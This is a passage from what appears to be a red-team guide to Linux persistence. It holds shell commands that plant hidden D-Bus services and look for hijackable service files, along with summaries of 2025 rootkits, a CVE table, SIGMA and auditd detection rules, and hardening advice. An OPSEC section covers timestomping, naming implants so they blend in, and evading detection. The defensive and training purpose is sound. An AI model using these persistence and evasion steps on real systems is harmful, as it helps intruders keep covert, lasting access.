SystemdService=system-helper-dbus.service
EOF

# Create corresponding systemd service
cat > /etc/systemd/system/system-helper-dbus.service << 'EOF'
[Unit]
Description=System Helper D-Bus Service

[Service]
Type=dbus
BusName=org.freedesktop.SystemHelper
ExecStart=/usr/local/sbin/.system-helper-dbus
EOF
```

#### Session-Level D-Bus Persistence (No Root)

```bash
mkdir -p ~/.local/share/dbus-1/services/

cat > ~/.local/share/dbus-1/services/org.gnome.UpdateNotifier.service << 'EOF'
[D-BUS Service]
Name=org.gnome.UpdateNotifier
Exec=/home/user/.local/bin/.notifier-dbus
EOF
```

#### D-Bus Activation Hijacking (Finding Targets)

```bash
# List existing D-Bus services to find hijacking candidates
busctl list --activatable
dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus \
    org.freedesktop.DBus.ListActivatableNames

# Find services with weak permissions or in writable directories
find /usr/share/dbus-1/ ~/.local/share/dbus-1/ -name "*.service" -writable 2>/dev/null
```

---

## 2025 Techniques

### eBPF-Based Rootkits: The New Frontier

The year 2025 was a watershed moment for eBPF-based threats:

1. **LinkPro** (October 2025): Discovered by Synacktiv during an AWS Kubernetes compromise investigation. Attackers exploited CVE-2024-23897 (Jenkins arbitrary file read) for initial access. LinkPro combines systemd masquerading, BPF pinning, magic packet activation, and LD_PRELOAD fallback -- the most sophisticated eBPF rootkit found in the wild.

2. **Caracal** (July 2025): Rust-based eBPF rootkit designed for red team operations, providing process hiding and BPF program concealment with modern language safety.

3. **BPFDoor Evolution**: FortiGuard Labs reported 151 new BPFDoor samples in 2025, indicating active development and widespread deployment.

4. **eBPF Escapes** (early 2026): Research demonstrated how eBPF monitoring tools themselves can be subverted to become rootkits, blurring the defensive/offensive boundary.

### Plague PAM Backdoor (August 2025)

Discovered by Nextron Systems, Plague is a malicious PAM module that:
- Silently bypasses system authentication for persistent SSH access
- Evolving obfuscation: XOR to KSA/PRGA to DRBG-based string encryption
- Zero antivirus detections on VirusTotal at time of discovery
- Multiple variants uploaded over one year with no public detection rules
- Represents the cutting edge of PAM-based threats

### Systemd Generator Abuse

2025 saw increased use of systemd generators as a persistence vector. Generators execute very early in the boot process (before most services) and are not commonly monitored by security tools. They can dynamically create unit files, symlinks, or drop-in overrides.

### PUMAKIT LKM Rootkit

Discovered in late 2024 and analyzed through 2025 by Elastic Security Labs, PUMAKIT uses ftrace to hook 18 syscalls and kernel functions. Features include staged deployment, kernel version checking, and multi-architecture support.

### CVEs Enabling Persistence (2024-2025)

| CVE | Description | Persistence Relevance |
|---|---|---|
| CVE-2024-23897 | Jenkins arbitrary file read | Initial access leading to LinkPro eBPF rootkit |
| CVE-2024-1086 | nf_tables use-after-free (Linux kernel) | Local privilege escalation to root for persistence |
| CVE-2024-21626 | runc container escape | Escape to host for host-level persistence |
| CVE-2023-32233 | Netfilter nf_tables use-after-free | Kernel privesc for LKM/eBPF persistence |

---

## Detection & Defense

### Log Sources by Mechanism

| Mechanism | Primary Log Source | Key Indicators |
|---|---|---|
| Cron | /var/log/cron, /var/log/syslog | New crontab entries, unexpected cron.d files |
| Systemd | journalctl, systemd unit directories | New .service/.timer files, daemon-reload events |
| Shell RC | File integrity monitoring (FIM) | Modifications to .bashrc, .profile, /etc/profile.d/ |
| PAM | /var/log/auth.log, FIM on /etc/pam.d/ | PAM config changes, new modules in security/ |
| LD_PRELOAD | FIM on /etc/ld.so.preload, auditd | Unexpected preload entries, new .so files |
| SSH Keys | FIM on authorized_keys files | New key entries, sshd_config modifications |
| Kernel Modules | dmesg, /var/log/kern.log, auditd | Module load events, tainted kernel |
| eBPF | bpftool prog list, auditd bpf() | Unexpected BPF programs, pinned objects |
| udev | udevadm monitor, FIM on rules.d/ | New rule files, unexpected RUN directives |

### SIGMA Detection Rules

```yaml
title: New Systemd Service File Created
status: experimental
logsource:
    product: linux
    category: file_create
detection:
    selection:
        TargetFilename|endswith:
            - '.service'
            - '.timer'
        TargetFilename|contains:
            - '/etc/systemd/system/'
            - '/usr/lib/systemd/system/'
            - '.config/systemd/user/'
    condition: selection
level: medium
---
title: LD_PRELOAD File Modification
status: experimental
logsource:
    product: linux
    category: file_change
detection:
    selection:
        TargetFilename:
            - '/etc/ld.so.preload'
            - '/etc/ld.so.conf'
    condition: selection
level: high
---
title: PAM Configuration Modified Outside Package Manager
status: experimental
logsource:
    product: linux
    category: file_change
detection:
    selection:
        TargetFilename|startswith: '/etc/pam.d/'
    filter:
        Image|endswith:
            - '/apt'
            - '/dpkg'
            - '/yum'
            - '/dnf'
    condition: selection and not filter
level: high
---
title: BPF Program Load via bpf() Syscall
status: experimental
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: bpf
    filter:
        exe|endswith:
            - '/systemd'
            - '/cilium-agent'
            - '/calico-node'
    condition: selection and not filter
level: medium
```

### Auditd Rules for Persistence Monitoring

```bash
# /etc/audit/rules.d/persistence.rules

# Crontab modifications
-w /var/spool/cron/ -p wa -k cron_persistence
-w /etc/cron.d/ -p wa -k cron_persistence
-w /etc/crontab -p wa -k cron_persistence

# Systemd unit files
-w /etc/systemd/system/ -p wa -k systemd_persistence
-w /usr/lib/systemd/system/ -p wa -k systemd_persistence

# PAM configuration
-w /etc/pam.d/ -p wa -k pam_persistence
-w /usr/lib/x86_64-linux-gnu/security/ -p wa -k pam_module_change
-w /usr/lib64/security/ -p wa -k pam_module_change

# LD_PRELOAD
-w /etc/ld.so.preload -p wa -k ld_preload_persistence
-w /etc/ld.so.conf -p wa -k ld_conf_change
-w /etc/ld.so.conf.d/ -p wa -k ld_conf_change

# SSH configuration
-w /etc/ssh/sshd_config -p wa -k ssh_config_change
-w /root/.ssh/authorized_keys -p wa -k ssh_key_change

# Kernel module loading
-a always,exit -F arch=b64 -S init_module -S finit_module -k kernel_module_load
-w /etc/modules-load.d/ -p wa -k module_persistence

# eBPF activity
-a always,exit -F arch=b64 -S bpf -k ebpf_activity

# udev rules
-w /etc/udev/rules.d/ -p wa -k udev_persistence
-w /usr/lib/udev/rules.d/ -p wa -k udev_persistence

# Shell RC files (system-wide)
-w /etc/profile -p wa -k shell_rc_change
-w /etc/profile.d/ -p wa -k shell_rc_change
-w /etc/bash.bashrc -p wa -k shell_rc_change
```

### Hardening Recommendations

1. **Immutable infrastructure**: Use read-only root filesystems (CoreOS, Bottlerocket).
2. **Secure Boot + Module Signing**: Enforce `CONFIG_MODULE_SIG_FORCE` to block unsigned LKMs.
3. **SELinux/AppArmor**: Mandatory access control prevents many persistence techniques.
4. **BPF restrictions**: Set `kernel.unprivileged_bpf_disabled=1` and use BPF LSM.
5. **File integrity monitoring**: Deploy AIDE, OSSEC, or Wazuh for persistence artifact detection.
6. **PAM integrity**: Hash PAM modules and monitor for changes.
7. **SSH hardening**: Disable PermitRootLogin, use AllowUsers/AllowGroups, disable agent forwarding.
8. **Audit comprehensively**: Deploy auditd rules covering all persistence directories.

---

## OPSEC Considerations

### Timestamps and File Attributes

```bash
# Preserve timestamps when creating persistence files (timestomping)
# Match timestamps to a nearby legitimate file
touch -r /etc/systemd/system/sshd.service /etc/systemd/system/your.service

# Match file ownership and permissions to surrounding files
ls -la /etc/systemd/system/ | head -5
chown root:root /etc/systemd/system/your.service
chmod 644 /etc/systemd/system/your.service
```

### Naming Conventions
- Name artifacts to blend with the local environment: `system-journald-helper.service` not `backdoor.service`
- Use dot-prefixed filenames for hidden files: `.libsystem.so` rather than `malware.so`
- Match naming patterns of existing entries in the target directory
- Avoid base64-encoded strings, IP addresses, or obviously suspicious names

### Reducing Detection Surface
- Prefer user-level persistence over system-level when adequate
- Use existing services as hosts (drop-in directories, not new services)
- Avoid `Restart=always` if the implant might crash -- generates visible journal entries
- Use specific cron times rather than `* * * * *`
- Consider systemd timers over cron (fewer organizations monitor timer creation)

### Privilege-Based Selection
- **User-level** (no root): cron, shell RC, XDG autostart, SSH keys, user systemd, D-Bus session services
- **Root-required**: system systemd, PAM, LD_PRELOAD global, kernel modules, udev, eBPF, sshd config

### Clean-Up Protocol

Always document planted persistence for removal during engagement debrief:

```bash
# Example cleanup manifest
# 1. rm /etc/systemd/system/system-health-monitor.service && systemctl daemon-reload
# 2. crontab -l | grep -v '.update.sh' | crontab -
# 3. sed -i '/.sys-init/d' ~/.bashrc
# 4. rm /etc/ld.so.preload
# 5. rmmod rootkit_module
# 6. sed -i '/attacker@c2/d' ~/.ssh/authorized_keys
# 7. rm /etc/udev/rules.d/99-persistence.rules && udevadm control --reload-rules
# 8. rm /etc/pam.d/sshd modifications; restore from backup
```

---

## Persistence Technique Selection Matrix

| Technique | Root Required | Survives Reboot | Stealth Level | Detection Difficulty |
|-----------|:------------:|:---------------:|:-------------:|:--------------------:|
| User crontab | No | Yes | Low | Low |
| System crontab | Yes | Yes | Low | Low |
| Systemd user service | No | Yes* | Medium | Medium |
| Systemd system service | Yes | Yes | Medium | Medium |
| Systemd timer | Yes/No | Yes | Medium | Medium-High |
| PAM backdoor | Yes | Yes | High | High |
| LD_PRELOAD (ld.so.preload) | Yes | Yes | High | Medium |
| Shell RC injection | No | Yes | Low | Low |
| SSH authorized_keys | No | Yes | Low-Medium | Low |
| XDG autostart | No | Yes (GUI only) | Low | Medium |
| Init.d scripts | Yes | Yes | Medium | Low |
| LKM rootkit | Yes | Depends** | Very High | Very High |
| eBPF rootkit | Yes | Depends** | Very High | Very High |
| Udev rules | Yes | Yes | Medium-High | Medium |
| D-Bus service | No/Yes | Yes | Medium | Medium-High |

\* Requires `loginctl enable-linger`
\** Requires separate persistence for the loader; rootkit itself is memory-resident

---

## Cross-References

- [SSH Backdoors](ssh-backdoors.md) - Detailed SSH persistence techniques
- [Scheduled Tasks](scheduled-tasks.md) - Windows Task Scheduler counterpart
- [Services Persistence](services-persistence.md) - Windows service counterpart
- [Cloud Persistence](cloud-persistence.md) - Cloud-specific persistence
- [Linux Credential Access](../07-credential-access/linux-credential-access.md) - Credential harvesting on Linux
- [Linux Privilege Escalation](../05-privilege-escalation/) - Required for root-level persistence
- [Defense Evasion](../06-defense-evasion/) - Techniques for avoiding detection of persistence
- [MITRE ATT&CK Index](../MITRE_ATTACK_INDEX.md) - Full technique index

---

## References

- MITRE ATT&CK T1053.003 - Cron: https://attack.mitre.org/techniques/T1053/003/
- MITRE ATT&CK T1543.002 - Systemd Service: https://attack.mitre.org/techniques/T1543/002/
- MITRE ATT&CK T1546.004 - Unix Shell Configuration Modification: https://attack.mitre.org/techniques/T1546/004/
- MITRE ATT&CK T1547.006 - Kernel Modules and Extensions: https://attack.mitre.org/techniques/T1547/006/
- MITRE ATT&CK T1574.006 - Dynamic Linker Hijacking: https://attack.mitre.org/techniques/T1574/006/
- MITRE ATT&CK T1556.003 - Pluggable Authentication Modules: https://attack.mitre.org/techniques/T1556/003/
- MITRE ATT&CK T1547.013 - XDG Autostart Entries: https://attack.mitre.org/techniques/T1547/013/
- MITRE ATT&CK T1546.017 - Udev Rules: https://attack.mitre.org/techniques/T1546/017/
- Synacktiv - LinkPro eBPF Rootkit Analysis (2025): https://www.synacktiv.com/en/publications/linkpro-ebpf-rootkit-analysis
- The Hacker News - LinkPro Linux Rootkit Uses eBPF (October 2025): https://thehackernews.com/2025/10/linkpro-linux-rootkit-uses-ebpf-to-hide.html
- Darknet - Caracal Rust eBPF Rootkit (July 2025): https://www.darknet.org.uk/2025/07/caracal-rust-ebpf-rootkit-for-stealthy-post-exploitation/
- Nextron Systems - Plague PAM Backdoor (August 2025): https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/
- Nextron Systems - Analyzing PAM Backdoors (May 2025): https://www.nextron-systems.com/2025/05/30/stealth-in-100-lines-analyzing-pam-backdoors-in-linux/
- Elastic Security Labs - Linux Persistence Detection Engineering: https://www.elastic.co/security-labs/approaching-the-summit-on-persistence
- Elastic Security Labs - Continuation on Persistence Mechanisms: https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms
- Elastic Security Labs - Sequel on Persistence Mechanisms: https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms
- Elastic Security Labs - Declawing PUMAKIT: https://www.elastic.co/security-labs/declawing-pumakit
- HADESS - The Art of Linux Persistence: https://hadess.io/the-art-of-linux-persistence/
- TripleCross eBPF Rootkit: https://github.com/h3xduck/TripleCross
- ebpfkit Rootkit: https://github.com/Gui774ume/ebpfkit
- Cymulate - eBPF: The Hacker's New Power Tool: https://cymulate.com/blog/ebpf_hacking/
- FortiGuard Labs - eBPF Filters for Symbiote and BPFdoor: https://www.fortinet.com/blog/threat-research/new-ebpf-filters-for-symbiote-and-bpfdoor-malware
- Splunk - Linux Preload Hijack Library Calls Detection: https://research.splunk.com/endpoint/cbe2ca30-631e-11ec-8670-acde48001122/
- Hackers Vanguard - Establishing Persistence with systemd.timers: https://hackersvanguard.com/establishing-persistence-systemd-timers/
- Atomic Red Team - T1543.002 Systemd Service: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.002/T1543.002.md
- ch4ik0 - Leveraging Linux udev for Persistence: https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/
- SecurityAffairs - Linux malware sedexp udev persistence: https://securityaffairs.com/167567/malware/linux-malware-sedexp.html
- Invary - eBPF Rootkit or EDR: https://www.invary.com/articles/ebpf-rootkit-or-edr
- Linux PAM Backdoor Repository: https://github.com/zephrax/linux-pam-backdoor
- Elastic Detection Rules - PAM_EXEC Backdoor: https://detection.fyi/elastic/detection-rules/linux/persistence_pluggable_authentication_module_pam_exec_backdoor_exec/
- LinuxSecurity - PAM Insights: https://linuxsecurity.com/features/pam-backdoors-linux-authentication-chain
- Kyntra Blog - Singularity Kernel Rootkit: https://blog.kyntra.io/Singularity-A-final-boss-linux-kernel-rootkit
- Intruceptlabs - LinkPro Evade Detection (October 2025): https://intruceptlabs.com/2025/10/advanced-ebpf-rootkit-linkpro-evade-detection-in-linux-systems-via-magic-tcp-packets/
- Medium - eBPF Escapes (January 2026): https://medium.com/@instatunnel/ebpf-escapes-when-your-monitoring-tool-becomes-the-ultimate-rootkit
